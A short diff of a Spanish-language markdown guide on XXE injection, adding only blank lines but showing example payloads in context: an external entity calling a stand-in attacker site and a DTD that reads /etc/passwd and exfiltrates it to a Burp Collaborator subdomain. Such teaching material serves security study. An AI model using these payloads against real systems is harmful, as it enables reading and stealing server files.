@@ -173,6 +173,7 @@ Ejemplo:
 
 **5.1- EJEMPLO 1**
 - Se inyecta en el valor &xxe; en uno de los valores xml que se envian
+
 ```xml
 <?xml version="1.0" encoding="UTF-8"?> 
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://web-atacante.com"> ]>
@@ -187,6 +188,7 @@ Ejemplo:
 
 **5.3- EJEMPLO 3**
 - Este codigo es de http://web-atacante.com/cositas.dtd
+
 ```xml
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://subdominio.burpcollaborator.net/?x=%file;'>">
